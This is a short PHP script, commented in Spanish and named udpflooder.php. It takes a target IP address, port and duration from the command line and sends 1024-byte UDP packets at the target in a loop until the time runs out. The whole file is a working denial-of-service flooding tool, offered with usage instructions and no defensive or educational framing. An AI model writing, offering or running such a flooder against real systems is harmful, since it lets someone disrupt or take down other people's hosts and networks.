<?php

// Obtener los argumentos de la línea de comandos
$targetIp = $argv[1] ?? null;
$targetPort = $argv[2] ?? null;
$duration = $argv[3] ?? null;

// Validar los argumentos
if (!$targetIp || !is_numeric($targetPort) || !is_numeric($duration)) {
    echo "Uso: php udpflooder.php <ip_objetivo> <puerto_objetivo> <duracion_en_segundos>\n";
    exit(1);
}

$targetPort = (int)$targetPort;
$duration = (int)$duration;

// Crear el socket UDP
$socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);

if (!$socket) {
    echo "Error al crear el socket: " . socket_strerror(socket_last_error()) . "\n";
    exit(1);
}

// Datos a enviar (puedes cambiar esto)
$data = str_repeat("A", 1024); // Crea una cadena de 1024 bytes con la letra "A"

echo "Iniciando inundación UDP a $targetIp:$targetPort durante $duration segundos...\n";

$startTime = time();

while (time() - $startTime < $duration) {
    $bytesSent = socket_sendto($socket, $data, strlen($data), 0, $targetIp, $targetPort);

    if ($bytesSent === false) {
        echo "Error al enviar datos: " . socket_strerror(socket_last_error($socket)) . "\n";
    }  //else {
       //echo "Enviados $bytesSent bytes a $targetIp:$targetPort\n"; // Esto puede llenar la terminal rápidamente
    //}
}

echo "Inundación completada.\n";

// Cerrar el socket
socket_close($socket);

?>
